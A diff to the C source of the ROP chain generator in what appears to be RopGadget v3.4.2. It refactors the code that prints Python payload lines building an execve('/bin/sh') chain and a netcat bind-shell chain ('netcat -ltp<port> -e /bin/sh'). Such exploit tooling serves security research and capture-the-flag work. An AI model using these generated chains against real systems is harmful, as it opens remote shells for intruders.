@@ -62,18 +62,12 @@ static Elf32_Addr ret_addr_makecodefunc(t_makecode *list_ins, char *instruction)
 {
   char  *p;
 
-  while (list_ins)
-    {
-      p = list_ins->instruction;
-      while (*p != 0)
-        {
-          if (!match(p, instruction, strlen(instruction)))
-            return (list_ins->addr);
-          p++;
-        }
-      list_ins = list_ins->next;
-    }
-  return (0);
+  for (; list_ins; list_ins = list_ins->next)
+    for (p = list_ins->instruction; *p != 0; p++)
+      if (!match(p, instruction, strlen(instruction)))
+        return list_ins->addr;
+
+  return 0;
 }
 
 /* returns the numbers of pop in the gadget. */
@@ -82,14 +76,11 @@ static int how_many_pop(char *gadget)
   int  cpt = 0;
   char *p;
 
-  p = gadget;
-  while(*p != '\0')
-    {
-      if (!strncmp(p, "pop", 3))
-        cpt++;
-      p++;
-    }
-  return (cpt);
+  for (p = gadget; *p != '\0'; p++)
+    if (!strncmp(p, "pop", 3))
+      cpt++;
+
+  return cpt;
 }
 
 /* returns first reg in "mov %e?x,(%e?x)" instruction */
@@ -125,13 +116,11 @@ static int how_many_pop_before(char *gadget, char *pop_reg)
 {
   int cpt = 0;
 
-  while (strncmp(gadget, pop_reg, strlen(pop_reg)) && *gadget != '\0')
-    {
-      if (!strncmp(gadget, "pop", 3))
-        cpt++;
-      gadget++;
-    }
-  return (cpt);
+  for (; strncmp(gadget, pop_reg, strlen(pop_reg)) && *gadget != '\0'; gadget++)
+    if (!strncmp(gadget, "pop", 3))
+      cpt++;
+
+  return cpt;
 }
 
 /* returns the numbers of "pop" after pop_reg */
@@ -139,31 +128,24 @@ static int how_many_pop_after(char *gadget, char *pop_reg)
 {
   int cpt = 0;
 
-  while(strncmp(gadget, pop_reg, strlen(pop_reg)))
-    {
-      if (*gadget == '\0')
-        return (0);
-      gadget++;
-    }
+  for(; strncmp(gadget, pop_reg, strlen(pop_reg)); gadget++)
+    if (*gadget == '\0')
+      return 0;
+
   gadget += strlen(pop_reg);
 
-  while (*gadget != '\0')
-    {
-      if (!strncmp(gadget, "pop", 3))
-        cpt++;
-      gadget++;
-    }
-  return (cpt);
+  for (; *gadget != '\0'; gadget++)
+    if (!strncmp(gadget, "pop", 3))
+      cpt++;
+
+  return cpt;
 }
 
 /* display padding */
 static void display_padding(int i)
 {
-  while (i != 0)
-    {
-      fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x42424242) # padding%s\n", BLUE, ENDC);
-      i--;
-    }
+  for (; i != 0; i--)
+    fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x42424242) # padding%s\n", BLUE, ENDC);
 }
 
 static void print_code(int word, char *comment)
@@ -171,104 +153,100 @@ static void print_code(int word, char *comment)
   fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # %s%s\n", BLUE, word, comment, ENDC);
 }
 
+static void print_code_padded(int addr, char *asm1, char *asm2)
+{
+  print_code(addr, asm1);
+  display_padding(how_many_pop_before(asm1, asm2));
+}
+
+static void print_code_padded1(int addr, char *asm1)
+{
+  print_code(addr, asm1);
+  display_padding(how_many_pop(asm1));
+}
+
 static void print_data_addr(int offset)
 {
   fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # @ .data + %d%s\n", BLUE, Addr_sData + offset, offset, ENDC);
 }
 
+static void print_data_addr_padded(int offset, char *asm1, char *asm2)
+{
+  print_data_addr(offset);
+  display_padding(how_many_pop_after(asm1, asm2));
+}
+
 static void print_quad(char *quad)
 {
-  fprintf(stdout, "\t\t%sp += \"%s\"%s\n", BLUE, quad, ENDC);
+  char tmp[5] = {0};
+  strncpy(tmp, quad, 4);
+  fprintf(stdout, "\t\t%sp += \"%s\"%s\n", BLUE, tmp, ENDC);
 }
 
-static void print_quad_int(int quad)
+static void print_quad_padded(char *quad, char *asm1, char *asm2)
 {
-  fprintf(stdout, "\t\t%sp += \"%d\"%s\n", BLUE, quad, ENDC);
+  print_quad(quad);
+  display_padding(how_many_pop_after(asm1, asm2));
 }
 
-/* partie 1 | write /bin/sh in .data for execve("/bin/sh", NULL, NULL)*/
-static void makepartie1_local(t_makecode *list_ins)
+static void print_string(char *str,
+Elf32_Addr addr_pop_stack_gadget, char *pop_stack_gadget, char *reg_stack,
+Elf32_Addr addr_pop_binsh_gadget, char *pop_binsh_gadget, char *reg_binsh,
+Elf32_Addr addr_mov_gadget, char *mov_gadget,
+Elf32_Addr addr_xor_gadget, char *xor_gadget,
+int offset_start)
 {
-  Elf32_Addr addr_mov_gadget;
-  Elf32_Addr addr_xor_gadget;
-  Elf32_Addr addr_pop_stack_gadget;
-  Elf32_Addr addr_pop_binsh_gadget;
-  char *mov_gadget;
-  char *xor_gadget;
-  char *pop_stack_gadget;
-  char *pop_binsh_gadget;
-  char *first_reg;
-  char *second_reg;
-  char reg_stack[32] = "pop %";
-  char reg_binsh[32] = "pop %";
-  char instr_xor[32] = "xor %";
+  int i;
+  int l = strlen(str);
 
-
-  addr_mov_gadget = ret_addr_makecodefunc(list_ins, "mov %e?x,(%e?x)");
-  mov_gadget = get_gadget_since_addr_att(addr_mov_gadget);
-
-  first_reg = get_first_reg(mov_gadget);
-  second_reg = get_second_reg(mov_gadget);
-
-  strncat(reg_stack, second_reg, 3);
-  strncat(reg_binsh, first_reg, 3);
-  strncat(instr_xor, first_reg, 3);
-
-  addr_pop_stack_gadget = ret_addr_makecodefunc(list_ins, reg_stack);
-  pop_stack_gadget = get_gadget_since_addr_att(addr_pop_stack_gadget);
-  addr_pop_binsh_gadget = ret_addr_makecodefunc(list_ins, reg_binsh);
-  pop_binsh_gadget = get_gadget_since_addr_att(addr_pop_binsh_gadget);
-
-  addr_xor_gadget = ret_addr_makecodefunc(list_ins, instr_xor);
-  xor_gadget = get_gadget_since_addr(addr_xor_gadget);
-
-  fprintf(stdout, "\t%sPayload%s\n", YELLOW, ENDC);
-  fprintf(stdout, "\t\t%s# execve /bin/sh generated by RopGadget v3.4.2%s\n", BLUE, ENDC);
-
-  /*****************\/bin*********************/
-  print_code(addr_pop_stack_gadget, pop_stack_gadget);
-  display_padding(how_many_pop_before(pop_stack_gadget, reg_stack));
-  print_data_addr(0);
-  display_padding(how_many_pop_after(pop_stack_gadget, reg_stack));
-  print_code(addr_pop_binsh_gadget, pop_binsh_gadget);
-  display_padding(how_many_pop_before(pop_binsh_gadget, reg_binsh));
-  print_quad("/bin");
-  display_padding(how_many_pop_after(pop_binsh_gadget, reg_binsh));
-  print_code(addr_mov_gadget, mov_gadget);
-  display_padding(how_many_pop(mov_gadget));
-  /*******************EOF*********************/
-
-  /*****************\//sh*********************/
-  print_code(addr_pop_stack_gadget, pop_stack_gadget);
-  display_padding(how_many_pop_before(pop_stack_gadget, reg_stack));
-  print_data_addr(4);
-  display_padding(how_many_pop_after(pop_stack_gadget, reg_stack));
-  print_code(addr_pop_binsh_gadget, pop_binsh_gadget);
-  display_padding(how_many_pop_before(pop_binsh_gadget, reg_binsh));
-  print_quad("//sh");
-  display_padding(how_many_pop_after(pop_binsh_gadget, reg_binsh));
-  print_code(addr_mov_gadget, mov_gadget);
-  display_padding(how_many_pop(mov_gadget));
-  /*******************EOF*********************/
-
-  /******************\0***********************/
-  print_code(addr_pop_stack_gadget, pop_stack_gadget);
-  display_padding(how_many_pop_before(pop_stack_gadget, reg_stack));
-  print_data_addr(8);
-  display_padding(how_many_pop_after(pop_stack_gadget, reg_stack));
-  print_code(addr_xor_gadget, xor_gadget);
-  print_code(addr_xor_gadget, xor_gadget);
-  display_padding(how_many_pop(xor_gadget));
-  print_code(addr_mov_gadget, mov_gadget);
-  display_padding(how_many_pop(mov_gadget));
-  /******************EOF**********************/
-
-  free(first_reg);
-  free(second_reg);
+  for (i = 0; i <= l; i+=4)
+    {
+      print_code_padded(addr_pop_stack_gadget, pop_stack_gadget, reg_stack);
+      print_data_addr_padded(offset_start + i, pop_stack_gadget, reg_stack);
+      if (i < l)
+        {
+          print_code_padded(addr_pop_binsh_gadget, pop_binsh_gadget, reg_binsh);
+          print_quad_padded(str+i, pop_binsh_gadget, reg_binsh);
+        }
+      else
+        {
+          print_code_padded1(addr_xor_gadget, xor_gadget);
+        }
+      print_code_padded1(addr_mov_gadget, mov_gadget);
+    }
 }
 
-/* partie 1 bis | write //usr/bin/netcat -ltp6666 -e///bin//sh in .data */
-static void makepartie1_remote(t_makecode *list_ins)
+static void print_vector(int *args,
+Elf32_Addr addr_pop_stack_gadget, char *pop_stack_gadget, char *reg_stack,
+Elf32_Addr addr_pop_binsh_gadget, char *pop_binsh_gadget, char *reg_binsh,
+Elf32_Addr addr_mov_gadget, char *mov_gadget,
+Elf32_Addr addr_xor_gadget, char *xor_gadget,
+int offset_start)
+{
+  int i;
+
+  for (i = 0; 1; i++)
+    {
+      print_code_padded(addr_pop_stack_gadget, pop_stack_gadget, reg_stack);
+      print_data_addr_padded(offset_start + 4*i, pop_stack_gadget, reg_stack);
+      if (args[i] != -1)
+        {
+          print_code_padded(addr_pop_binsh_gadget, pop_binsh_gadget, reg_binsh);
+          print_data_addr_padded(args[i], pop_binsh_gadget, reg_binsh);
+        }
+      else
+        {
+          print_code_padded1(addr_xor_gadget, xor_gadget);
+        }
+      print_code_padded1(addr_mov_gadget, mov_gadget);
+      if (args[i] == -1)
+        return;
+    }
+}
+
+/* local: partie 1 | write /bin/sh in .data for execve("/bin/sh", NULL, NULL)*/
+/* remote: partie 1 bis | write //usr/bin/netcat -ltp6666 -e///bin//sh in .data */
+static void makepartie1(t_makecode *list_ins, int local)
 {
   Elf32_Addr addr_mov_gadget;
   Elf32_Addr addr_xor_gadget;
@@ -304,262 +282,49 @@ static void makepartie1_remote(t_makecode *list_ins)
   xor_gadget = get_gadget_since_addr(addr_xor_gadget);
 
   fprintf(stdout, "\t%sPayload%s\n", YELLOW, ENDC);
-  fprintf(stdout, "\t\t%s# execve /bin/sh bindport %d generated by RopGadget v3.4.2%s\n", BLUE, bind_mode.port, ENDC);
+  if (local)
+    {
+      fprintf(stdout, "\t\t%s# execve /bin/sh generated by RopGadget v3.4.2%s\n", BLUE, ENDC);
 
-  /*****************\//us*********************/
-  print_code(addr_pop_stack_gadget, pop_stack_gadget);
-  display_padding(how_many_pop_before(pop_stack_gadget, reg_stack));
-  print_data_addr(0);
-  display_padding(how_many_pop_after(pop_stack_gadget, reg_stack));
-  print_code(addr_pop_binsh_gadget, pop_binsh_gadget);
-  display_padding(how_many_pop_before(pop_binsh_gadget, reg_binsh));
-  print_quad("//us");
-  display_padding(how_many_pop_after(pop_binsh_gadget, reg_binsh));
-  print_code(addr_mov_gadget, mov_gadget);
-  display_padding(how_many_pop(mov_gadget));
-  /*******************EOF*********************/
+      print_string("/bin//sh",
+        addr_pop_stack_gadget, pop_stack_gadget, reg_stack,
+        addr_pop_binsh_gadget, pop_binsh_gadget, reg_binsh,
+        addr_mov_gadget, mov_gadget,
+        addr_xor_gadget, xor_gadget, 0);
+    }
+  else
+    {
+      fprintf(stdout, "\t\t%s# execve /bin/sh bindport %d generated by RopGadget v3.4.2%s\n", BLUE, bind_mode.port, ENDC);
 
-  /******************r/bi*********************/
-  print_code(addr_pop_stack_gadget, pop_stack_gadget);
-  display_padding(how_many_pop_before(pop_stack_gadget, reg_stack));
-  print_data_addr(4);
-  display_padding(how_many_pop_after(pop_stack_gadget, reg_stack));
-  print_code(addr_pop_binsh_gadget, pop_binsh_gadget);
-  display_padding(how_many_pop_before(pop_binsh_gadget, reg_binsh));
-  print_quad("r/bi");
-  display_padding(how_many_pop_after(pop_binsh_gadget, reg_binsh));
-  print_code(addr_mov_gadget, mov_gadget);
-  display_padding(how_many_pop(mov_gadget));
-  /*******************EOF*********************/
+      print_string("//usr/bin/netcat",
+        addr_pop_stack_gadget, pop_stack_gadget, reg_stack,
+        addr_pop_binsh_gadget, pop_binsh_gadget, reg_binsh,
+        addr_mov_gadget, mov_gadget,
+        addr_xor_gadget, xor_gadget, 0);
 
-  /*****************\n/ne*********************/
-  print_code(addr_pop_stack_gadget, pop_stack_gadget);
-  display_padding(how_many_pop_before(pop_stack_gadget, reg_stack));
-  print_data_addr(8);
-  display_padding(how_many_pop_after(pop_stack_gadget, reg_stack));
-  print_code(addr_pop_binsh_gadget, pop_binsh_gadget);
-  display_padding(how_many_pop_before(pop_binsh_gadget, reg_binsh));
-  print_quad("n/ne");
-  display_padding(how_many_pop_after(pop_binsh_gadget, reg_binsh));
-  print_code(addr_mov_gadget, mov_gadget);
-  display_padding(how_many_pop(mov_gadget));
-  /*******************EOF*********************/
+      char opts[9] = {0};
+      sprintf(opts, "-ltp%d", bind_mode.port);
 
-  /******************tcat*********************/
-  print_code(addr_pop_stack_gadget, pop_stack_gadget);
-  display_padding(how_many_pop_before(pop_stack_gadget, reg_stack));
-  print_data_addr(12);
-  display_padding(how_many_pop_after(pop_stack_gadget, reg_stack));
-  print_code(addr_pop_binsh_gadget, pop_binsh_gadget);
-  display_padding(how_many_pop_before(pop_binsh_gadget, reg_binsh));
-  print_quad("tcat");
-  display_padding(how_many_pop_after(pop_binsh_gadget, reg_binsh));
-  print_code(addr_mov_gadget, mov_gadget);
-  display_padding(how_many_pop(mov_gadget));
-  /*******************EOF*********************/
+      print_string(opts,
+        addr_pop_stack_gadget, pop_stack_gadget, reg_stack,
+        addr_pop_binsh_gadget, pop_binsh_gadget, reg_binsh,
+        addr_mov_gadget, mov_gadget,
+        addr_xor_gadget, xor_gadget, 17);
 
-  /******************\0***********************/
-  print_code(addr_pop_stack_gadget, pop_stack_gadget);
-  display_padding(how_many_pop_before(pop_stack_gadget, reg_stack));
-  print_data_addr(16);
-  display_padding(how_many_pop_after(pop_stack_gadget, reg_stack));
-  print_code(addr_xor_gadget, xor_gadget);
-  display_padding(how_many_pop(xor_gadget));
-  print_code(addr_mov_gadget, mov_gadget);
-  display_padding(how_many_pop(mov_gadget));
-  /******************EOF**********************/
+      print_string("-e///bin//sh",
+        addr_pop_stack_gadget, pop_stack_gadget, reg_stack,
+        addr_pop_binsh_gadget, pop_binsh_gadget, reg_binsh,
+        addr_mov_gadget, mov_gadget,
+        addr_xor_gadget, xor_gadget, 26);
 
+      int offsets[] = {0, 17, 26, -1};
 
-
-  /******************-ltp*********************/
-  print_code(addr_pop_stack_gadget, pop_stack_gadget);
-  display_padding(how_many_pop_before(pop_stack_gadget, reg_stack));
-  print_data_addr(17);
-  display_padding(how_many_pop_after(pop_stack_gadget, reg_stack));
-  print_code(addr_pop_binsh_gadget, pop_binsh_gadget);
-  display_padding(how_many_pop_before(pop_binsh_gadget, reg_binsh));
-  print_quad("-ltp");
-  display_padding(how_many_pop_after(pop_binsh_gadget, reg_binsh));
-  print_code(addr_mov_gadget, mov_gadget);
-  display_padding(how_many_pop(mov_gadget));
-  /*******************EOF*********************/
-
-  /******************<PORT>*******************/
-  print_code(addr_pop_stack_gadget, pop_stack_gadget);
-  display_padding(how_many_pop_before(pop_stack_gadget, reg_stack));
-  print_data_addr(21);
-  display_padding(how_many_pop_after(pop_stack_gadget, reg_stack));
-  print_code(addr_pop_binsh_gadget, pop_binsh_gadget);
-  display_padding(how_many_pop_before(pop_binsh_gadget, reg_binsh));
-  print_quad_int(bind_mode.port);
-  display_padding(how_many_pop_after(pop_binsh_gadget, reg_binsh));
-  print_code(addr_mov_gadget, mov_gadget);
-  display_padding(how_many_pop(mov_gadget));
-  /*******************EOF*********************/
-
-  /******************\0***********************/
-  print_code(addr_pop_stack_gadget, pop_stack_gadget);
-  display_padding(how_many_pop_before(pop_stack_gadget, reg_stack));
-  print_data_addr(25);
-  display_padding(how_many_pop_after(pop_stack_gadget, reg_stack));
-  print_code(addr_xor_gadget, xor_gadget);
-  display_padding(how_many_pop(xor_gadget));
-  print_code(addr_mov_gadget, mov_gadget);
-  display_padding(how_many_pop(mov_gadget));
-  /******************EOF**********************/
-
-
-
-  /******************-e//\********************/
-  print_code(addr_pop_stack_gadget, pop_stack_gadget);
-  display_padding(how_many_pop_before(pop_stack_gadget, reg_stack));
-  print_data_addr(26);
-  display_padding(how_many_pop_after(pop_stack_gadget, reg_stack));
-  print_code(addr_pop_binsh_gadget, pop_binsh_gadget);
-  display_padding(how_many_pop_before(pop_binsh_gadget, reg_binsh));
-  print_quad("-e//");
-  display_padding(how_many_pop_after(pop_binsh_gadget, reg_binsh));
-  print_code(addr_mov_gadget, mov_gadget);
-  display_padding(how_many_pop(mov_gadget));
-  /*******************EOF*********************/
-
-  /*****************\/bin*********************/
-  print_code(addr_pop_stack_gadget, pop_stack_gadget);
-  display_padding(how_many_pop_before(pop_stack_gadget, reg_stack));
-  print_data_addr(30);
-  display_padding(how_many_pop_after(pop_stack_gadget, reg_stack));
-  print_code(addr_pop_binsh_gadget, pop_binsh_gadget);
-  display_padding(how_many_pop_before(pop_binsh_gadget, reg_binsh));
-  print_quad("/bin");
-  display_padding(how_many_pop_after(pop_binsh_gadget, reg_binsh));
-  print_code(addr_mov_gadget, mov_gadget);
-  display_padding(how_many_pop(mov_gadget));
-  /*******************EOF*********************/
-
-  /******************\//sh********************/
-  print_code(addr_pop_stack_gadget, pop_stack_gadget);
-  display_padding(how_many_pop_before(pop_stack_gadget, reg_stack));
-  print_data_addr(34);
-  display_padding(how_many_pop_after(pop_stack_gadget, reg_stack));
-  print_code(addr_pop_binsh_gadget, pop_binsh_gadget);
-  display_padding(how_many_pop_before(pop_binsh_gadget, reg_binsh));
-  print_quad("//sh");
-  display_padding(how_many_pop_after(pop_binsh_gadget, reg_binsh));
-  print_code(addr_mov_gadget, mov_gadget);
-  display_padding(how_many_pop(mov_gadget));
-  /*******************EOF*********************/
-
-  /******************\0***********************/
-  print_code(addr_pop_stack_gadget, pop_stack_gadget);
-  display_padding(how_many_pop_before(pop_stack_gadget, reg_stack));
-  print_data_addr(38);
-  display_padding(how_many_pop_after(pop_stack_gadget, reg_stack));
-  print_code(addr_xor_gadget, xor_gadget);
-  display_padding(how_many_pop(xor_gadget));
-  print_code(addr_mov_gadget, mov_gadget);
-  display_padding(how_many_pop(mov_gadget));
-  /******************EOF**********************/
-
-
-  /*********************************** make now arg_tab[] ***********************************/
-  /*
-  ** data + 0  = "//usr/bin/netcat"
-  ** data + 17 = "-ltp6666"
-  ** data + 26 = "-e///bin//sh"
-  **                          ^
-  **                          +-- data + 38
-  **
-  ** data + 40 = data + 0
-  ** data + 44 = data + 17
-  ** data + 48 = data + 26
-  ** data + 52 = NULL
-  */
-
-  /****************** data + 0 ********************/
-  print_code(addr_pop_stack_gadget, pop_stack_gadget);
-  display_padding(how_many_pop_before(pop_stack_gadget, reg_stack));
-  print_data_addr(40);
-  display_padding(how_many_pop_after(pop_stack_gadget, reg_stack));
-  print_code(addr_pop_binsh_gadget, pop_binsh_gadget);
-  display_padding(how_many_pop_before(pop_binsh_gadget, reg_binsh));
-  print_data_addr(0);
-  display_padding(how_many_pop_after(pop_binsh_gadget, reg_binsh));
-  print_code(addr_mov_gadget, mov_gadget);
-  display_padding(how_many_pop(mov_gadget));
-  /*******************  EOF  **********************/
-
-  /****************** data + 17 ********************/
-  print_code(addr_pop_stack_gadget, pop_stack_gadget);
-  display_padding(how_many_pop_before(pop_stack_gadget, reg_stack));
-  print_data_addr(44);
-  display_padding(how_many_pop_after(pop_stack_gadget, reg_stack));
-  print_code(addr_pop_binsh_gadget, pop_binsh_gadget);
-  display_padding(how_many_pop_before(pop_binsh_gadget, reg_binsh));
-  print_data_addr(17);
-  display_padding(how_many_pop_after(pop_binsh_gadget, reg_binsh));
-  print_code(addr_mov_gadget, mov_gadget);
-  display_padding(how_many_pop(mov_gadget));
-  /*******************  EOF  **********************/
-
-  /****************** data + 17 ********************/
-  print_code(addr_pop_stack_gadget, pop_stack_gadget);
-  display_padding(how_many_pop_before(pop_stack_gadget, reg_stack));
-  print_data_addr(48);
-  display_padding(how_many_pop_after(pop_stack_gadget, reg_stack));
-  print_code(addr_pop_binsh_gadget, pop_binsh_gadget);
-  display_padding(how_many_pop_before(pop_binsh_gadget, reg_binsh));
-  print_data_addr(26);
-  display_padding(how_many_pop_after(pop_binsh_gadget, reg_binsh));
-  print_code(addr_mov_gadget, mov_gadget);
-  display_padding(how_many_pop(mov_gadget));
-  /*******************  EOF  **********************/
-
-  /****************** \0 [1] ***********************/
-  print_code(addr_pop_stack_gadget, pop_stack_gadget);
-  display_padding(how_many_pop_before(pop_stack_gadget, reg_stack));
-  print_data_addr(52);
-  display_padding(how_many_pop_after(pop_stack_gadget, reg_stack));
-  print_code(addr_xor_gadget, xor_gadget);
-  display_padding(how_many_pop(xor_gadget));
-  print_code(addr_mov_gadget, mov_gadget);
-  display_padding(how_many_pop(mov_gadget));
-  /****************** EOF **************************/
-
-  /****************** \0 [2] ***********************/
-  print_code(addr_pop_stack_gadget, pop_stack_gadget);
-  display_padding(how_many_pop_before(pop_stack_gadget, reg_stack));
-  print_data_addr(53);
-  display_padding(how_many_pop_after(pop_stack_gadget, reg_stack));
-  print_code(addr_xor_gadget, xor_gadget);
-  display_padding(how_many_pop(xor_gadget));
-  print_code(addr_mov_gadget, mov_gadget);
-  display_padding(how_many_pop(mov_gadget));
-  /****************** EOF **************************/
-
-  /****************** \0 [3] ***********************/
-  print_code(addr_pop_stack_gadget, pop_stack_gadget);
-  display_padding(how_many_pop_before(pop_stack_gadget, reg_stack));
-  print_data_addr(54);
-  display_padding(how_many_pop_after(pop_stack_gadget, reg_stack));
-  print_code(addr_xor_gadget, xor_gadget);
-  display_padding(how_many_pop(xor_gadget));
-  print_code(addr_mov_gadget, mov_gadget);
-  display_padding(how_many_pop(mov_gadget));
-  /****************** EOF **************************/
-
-  /****************** \0 [4] ***********************/
-  print_code(addr_pop_stack_gadget, pop_stack_gadget);
-  display_padding(how_many_pop_before(pop_stack_gadget, reg_stack));
-  print_data_addr(55);
-  display_padding(how_many_pop_after(pop_stack_gadget, reg_stack));
-  print_code(addr_xor_gadget, xor_gadget);
-  display_padding(how_many_pop(xor_gadget));
-  print_code(addr_mov_gadget, mov_gadget);
-  display_padding(how_many_pop(mov_gadget));
-  /****************** EOF **************************/
-
-  /**************************************** EOF *********************************************/
-
+      print_vector(&offsets[0],
+        addr_pop_stack_gadget, pop_stack_gadget, reg_stack,
+        addr_pop_binsh_gadget, pop_binsh_gadget, reg_binsh,
+        addr_mov_gadget, mov_gadget,
+        addr_xor_gadget, xor_gadget, 40);
+    }
   free(first_reg);
   free(second_reg);
 }
@@ -583,30 +348,16 @@ static void makepartie2(t_makecode *list_ins, int local)
   pop_edx_gadget = get_gadget_since_addr_att(addr_pop_edx);
 
   /* set %ebx */
-  print_code(addr_pop_ebx, pop_ebx_gadget);
-  display_padding(how_many_pop_before(pop_ebx_gadget, "pop %ebx"));
-  print_data_addr(0);
-  display_padding(how_many_pop_after(pop_ebx_gadget, "pop %ebx"));
+  print_code_padded(addr_pop_ebx, pop_ebx_gadget, "pop %ebx");
+  print_data_addr_padded(0, pop_ebx_gadget, "pop %ebx");
 
   /* set %ecx */
-  print_code(addr_pop_ecx, pop_ecx_gadget);
-  display_padding(how_many_pop_before(pop_ecx_gadget, "pop %ecx"));
-  if (local) {
-    print_data_addr(8);
-  } else {
-    print_data_addr(40);
-  }
-  display_padding(how_many_pop_after(pop_ecx_gadget, "pop %ecx"));
+  print_code_padded(addr_pop_ecx, pop_ecx_gadget, "pop %ecx");
+  print_data_addr_padded(local?8:40, pop_ecx_gadget, "pop %ecx");
 
   /* set %edx */
-  print_code(addr_pop_edx, pop_edx_gadget);
-  display_padding(how_many_pop_before(pop_edx_gadget, "pop %edx"));
-  if (local) {
-    print_data_addr(8);
-  } else {
-    print_data_addr(52);
-  }
-  display_padding(how_many_pop_after(pop_edx_gadget, "pop %edx"));
+  print_code_padded(addr_pop_edx, pop_edx_gadget, "pop %edx");
+  print_data_addr_padded(local?8:52, pop_edx_gadget, "pop %edx");
 }
 
 /* partie 3 init eax = 0xb (execve) */
@@ -616,7 +367,7 @@ static void makepartie3(t_makecode *list_ins)
   Elf32_Addr addr_inc_eax;
   char *xor_eax_gadget;
   char *inc_eax_gadget;
-  int i = 0;
+  int i;
 
   addr_xor_eax = ret_addr_makecodefunc(list_ins, "xor %eax,%eax");
   addr_inc_eax = ret_addr_makecodefunc(list_ins, "inc %eax");
@@ -628,12 +379,8 @@ static void makepartie3(t_makecode *list_ins)
   display_padding(how_many_pop(xor_eax_gadget));
 
   /* set %eax => 0xb for sys_execve() */
-  while (i != 0xb)
-    {
-      print_code(addr_inc_eax, inc_eax_gadget);
-      display_padding(how_many_pop(inc_eax_gadget));
-      i++;
-    }
+  for (i = 0; i != 0xb; i++)
+    print_code_padded1(addr_inc_eax, inc_eax_gadget);
 }
 
 /* partie 4 call "int 0x80" or "sysenter" */
@@ -661,14 +408,7 @@ static void makepartie4(t_makecode *list_ins)
 
 void makecode(t_makecode *list_ins)
 {
-  if (!bind_mode.flag)
-    {
-      makepartie1_local(list_ins);
-    }
-  else
-    {
-      makepartie1_remote(list_ins);
-    }
+  makepartie1(list_ins, !bind_mode.flag);
   makepartie2(list_ins, !bind_mode.flag);
   makepartie3(list_ins);
   makepartie4(list_ins);
